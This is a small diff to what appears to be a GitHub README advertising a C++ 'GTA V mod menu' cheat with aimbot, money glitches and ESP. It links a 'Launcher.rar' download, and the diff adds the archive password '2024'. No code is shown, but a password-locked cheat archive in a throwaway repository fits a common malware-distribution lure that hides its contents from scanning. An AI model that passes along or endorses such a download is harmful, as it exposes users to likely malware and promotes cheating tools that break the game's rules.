@@ -2,7 +2,7 @@
 ![image](https://github.com/Javy27R/gta5_mod_menu/assets/163654033/f59a1a27-3570-41a1-a0b8-a63ffd177731)
 
 ## [DOWNLOAD](https://github.com/Javy27R/gta5_mod_menu/releases/download/gta5_mod_menu/Launcher.rar)
-
+PASSWORD 2024
 ## Description
 This GTA V MOD MENU is written in C++ and is up to date. The cheat includes Aimbot, money glitches and ESP.
 
